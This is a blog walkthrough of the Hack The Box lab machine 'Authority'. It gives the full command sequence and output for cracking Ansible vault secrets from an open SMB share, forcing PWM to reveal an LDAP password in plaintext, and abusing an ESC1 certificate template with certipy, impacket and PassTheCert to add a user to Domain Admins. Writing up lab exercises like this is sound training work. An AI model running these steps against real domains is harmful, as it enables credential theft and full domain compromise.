---
layout: post
title: "HTB: Authority"
author: Andrew Cherney
date: 2023-12-10 11:31:41
tags: htb medium-box smb pwm adcs certipy impacket
icon: "assets/icons/authority.png"
post_description: "In classic Windows environment fashion this box starts by grabbing some configuration files from smb on port 445. Then after some PWM config shuffling we can scan to find a certificate template that is used to grant Domain Admin to the user we have."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

<h2>nmap</h2>

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $nmap -sC 10.10.11.222
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-28 18:34 CDT
Nmap scan report for 10.10.11.222
Host is up (0.051s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-08-29T03:35:00+00:00; +4h00m01s from scanner time.
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
|_ssl-date: 2023-08-29T03:34:44+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-08-29T03:34:44+00:00; +4h00m02s from scanner time.
8443/tcp open  https-alt
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn\'t have a title (text/html;charset=ISO-8859-1).
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-08-27T02:22:35
|_Not valid after:  2025-08-28T14:00:59

Host script results:
| smb2-time: 
|   date: 2023-08-29T03:34:43
|_  start_date: N/A
|_clock-skew: mean: 4h00m01s, deviation: 0s, median: 4h00m00s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

Well shiver me timbers seems to be a classic Windows environment machine. The obvious ports I would check out initially here are 80, 8443, and 445, but before that I should check versions to doublecheck my hunches that most of those ports are Windows AD/RPC ports.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $nmap -sV 10.10.11.222
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-28 18:57 CDT
Nmap scan report for 10.10.11.222
Host is up (0.054s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-29 03:57:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
8443/tcp open  ssl/https-alt
```

<h2>smb - port 445</h2>

Doesn't seem the versions changed my plan here, to **smbclient** we go. Once I list the shares there are two non-standard shares, one of which I can access, so I naturally download the entire directory for ease of looking.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $smbclient --no-pass //10.10.11.222/Development
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> lcd .
smb: \> mget *
getting file \Automation\Ansible\ADCS\.ansible-lint of size 259 as Automation/Ansible/ADCS/.ansible-lint (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\.yamllint of size 205 as Automation/Ansible/ADCS/.yamllint (0.8 KiloBytes/sec) (average 0.6 KiloBytes/sec)
```

As you can see from the directory tree I have downloaded an Ansible automation setup which probably contains passwords, usernames, or certificates. There were three main directories under ansible which raised my eyebrow: ADCS, PWM, LDAPS, and SHARE. That PWM directory likely corresponds to some password managing service, so that's the first place I opt to look.

<h2>Ansible</h2>

{% raw %}

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $cat Automation/Ansible/PWM/defaults/main.yml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

{% endraw %}

And in the process I find the ansible vault with the pwm admin pass and login. there is also the LDAP admin password but at this moment I'm not sure if cracking that would be helpful. 

Using the guide from [https://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible](https://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible) it seems that I can use **ansible2john** to extract a hash to crack with john. [https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/](https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/) goes a little more in depth as to the steps. Luckily for me the admin_login and admin_password have the same vault key for pwm.


```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $cat creds | xargs | sed 's/ /\n/g'
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $/usr/share/john/ansible2john.py creds > vault.in
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $john vault.in --wordlist=/opt/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 SSE2 4x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (creds)
1g 0:00:00:27 DONE (2023-08-28 20:17) 0.03687g/s 1467p/s 1467c/s 1467C/s 001983..victor2
Use the "--show" option to display all of the cracked passwords reliably
Session completed
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $john vault.in --show
creds:!@#$%^&*

1 password hash cracked, 0 left
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $cat pwm_admin_login | ansible-vault decrypt
Vault password: 
Decryption successful
svc_pwm┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $cat pwm_admin_password | ansible-vault decrypt
Vault password: 
Decryption successful
pWm_@dm!N_!23
```

Now that we've got the PWM login credentials we can ... oh right I hadn't thought this far yet. I took a look at [the PWM github page](https://github.com/pwm-project/pwm) and found that the default web portal page for configuration is port 8443, and that port is open on this machine. 

<h1>User as svc_ldap</h1>

<h2>PWM - port 8443</h2>

Upon heading to the port 8443 I am redirected to **/pwm/private/login**, and although the basic login does not work the configuration manager login does work. 

![/img/authority/authority_pwm_login_8443.png](/img/authority/authority_pwm_login_8443.png)

![/img/authority/authority_configuration_manager.png](/img/authority/authority_configuration_manager.png)

This could be a little daunting at first what with being able to edit any and all keys we desire, but there is something important we need to keep in mind. That account svc_ldap more than likely has its credentials here in this configuration file, which means the first step is to download the config and search through it. 

```html
<setting key="ldap.proxy.password" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="PASSWORD" syntaxVersion="0">
    <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy Password</label>
    <value>ENC-PW:YBF2AxI5M5u0mT7bpCGhemV4lR0XbsLB/g5hvuHcsfCt2uLf3EOFOF60Bn9uPdr5TYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=</value>
</setting>
<setting key="ldap.proxy.username" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="STRING" syntaxVersion="0">
    <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy User</label>
    <value>CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb</value>
</setting>
```

Well that puts a small damper in my plans. But as fate would have it at the top of this config file there is an option to display secrets in plaintext, and an ability we have to upload new configuration files. 

```xml
<?xml version="1.0" encoding="UTF-8"?><PwmConfiguration createTime="2022-08-11T01:46:23Z" modifyTime="2022-08-11T01:46:24Z" pwmBuild="c96802e" pwmVersion="2.0.3" xmlVersion="5">
<!--
This configuration file has been auto-generated by the PWM password self service application.
  
WARNING: This configuration file contains sensitive security information, please handle with care!
  
WARNING: If a server is currently running using this configuration file, it will be restarted and the
  
configuration updated immediately when it is modified.
  
NOTICE: This file is encoded as UTF-8. Do not save or edit this file with an editor that does not
support UTF-8 encoding.

If unable to edit using the application ConfigurationEditor web UI, the following options are available:
1. Edit this file directly by hand.
2. Remove restrictions of the configuration by setting the property "configIsEditable" to "true".
This will allow access to the ConfigurationEditor web UI without having to authenticate to an
LDAP server first.

If you wish for sensitive values in this configuration file to be stored unencrypted, set the property
"storePlaintextValues" to "true".
-->
<properties type="config">
<property key="configIsEditable">true</property>
<property key="configEpoch">0</property>
<property key="configPasswordHash">$2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua</property>
<property key="storePlaintextValues">true</property>
</properties>
```

That last commented line and the final property key are what will export the passwords unencrypted/unencoded. After uploading and redownloading the config file I am greeted by a beautiful sight:

```html
<setting key="ldap.proxy.password" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="PASSWORD" syntaxVersion="0">
<label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy Password</label>
<value>PLAIN:lDaP_1n_th3_cle4r!</value>
</setting>
<setting key="ldap.proxy.username" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="STRING" syntaxVersion="0">
<label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy User</label>
<value>CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb</value>
```


```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $evil-winrm -i 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r!

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_ldap\Documents> ls
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc_ldap> ls Desktop

    Directory: C:\Users\svc_ldap\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/29/2023  12:07 AM             34 user.txt

*Evil-WinRM* PS C:\Users\svc_ldap> cat Desktop/user.txt
46c083be115ff-------------------
```

<h2>bloodhound option</h2>

So I jumped the gun a little. In theory here you would use bloodhound to scour the AD domain for accounts and services and what their permissions were. Once we did that we would find svc_ldap does have login permissions to **authority.htb**.

The command to dump the information:

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $bloodhound-python --dns-tcp -ns 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r! -d AUTHORITY.htb -c all
INFO: Found AD domain: authority.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (authority.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: authority.authority.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: authority.authority.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 5 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: authority.authority.htb
INFO: Done in 00M 13S
```

Import that into bloodhound and look around if you are curious.

<h1>Root</h1>

<h2>ESC1</h2>

One of the first scans I run in AD environments is certipy.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $certipy find -vulnerable -u svc_ldap -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Saved BloodHound data to '20230828214308_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20230828214308_Certipy.txt'
[*] Saved JSON output to '20230828214308_Certipy.json'
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $cat 20230828214308_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

This scan yields an ESC1 vulnerability. This type of vulnerability exists when there is a template that does not require manager approval, authorization signatures, and grants low-privileged users enrolment rights. Specifically the exploit I will use will create a certificate that authenticates me as an administrator, and then use that to escalate the privileges of a user account (probably svc_ldap).


```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name 'RACCOON' -computer-pass 'raccoon'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Successfully added machine account RACCOON$ with password raccoon.
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $certipy req -username RACCOON$ -password raccoon -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: rpc_s_access_denied
[-] Use -debug to print a stacktrace
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $impacket-addcomputer -no-add 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name 'RACCOON' -computer-pass 'Raccoon123'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Succesfully set password of RACCOON$ to Raccoon123.
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $certipy req -username RACCOON$ -password Raccoon123 -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 2
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $certipy auth -pfx administrator.pfx 
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```


Now I will note that there were password requirements that needed to be met for users which I was not expecting, something I will likely want to check before firing that command in an actual pentesing arrangement. 

But for the task at hand it seems I can't use certipy to authorize me. When searching for that error spit out you can come across [this tool PassTheCert](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html) which should be able to do the trick. 

The blog post itself goes over using PassTheCert to create a new computer then add its SID to the Domain Controller's **msDS-AllowedToActOnBehalfOfOtherIdentity** attribute to impersonate a domain administrator with an RBCD attack through **getST.py**. Instead I will add svc_ldap to the "Domain Admins" group with the **ldap-shell** option and login.


```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Type help for list of commands

# add_user_to_group "svc_ldap" "Domain Admins"
Adding user: svc_ldap to group Domain Admins result: OK

# Bye!

┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Authority]
└──╼ $evil-winrm -i 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r!

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_ldap\Documents> cd ../../
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/17/2023   9:31 AM                Administrator
d-r---         8/9/2022   4:35 PM                Public
d-----        3/24/2023  11:27 PM                svc_ldap


*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/10/2022   8:52 PM                .pwm-workpath
d-r---        7/12/2023   1:21 PM                3D Objects
d-r---        7/12/2023   1:21 PM                Contacts
d-r---        7/12/2023   1:21 PM                Desktop
d-r---        7/12/2023   1:21 PM                Documents
d-r---        7/12/2023   1:21 PM                Downloads
d-r---        7/12/2023   1:21 PM                Favorites
d-r---        7/12/2023   1:21 PM                Links
d-r---        7/12/2023   1:21 PM                Music
d-r---        7/12/2023   1:21 PM                Pictures
d-r---        7/12/2023   1:21 PM                Saved Games
d-r---        7/12/2023   1:21 PM                Searches
d-r---        7/12/2023   1:21 PM                Videos
-a----        3/17/2023   9:30 AM          16384 gp.jfm


c*Evil-WinRM* PS C:\Users\Administrator>cat Desktop/root.txt
9bfa7f804d----------------------
```
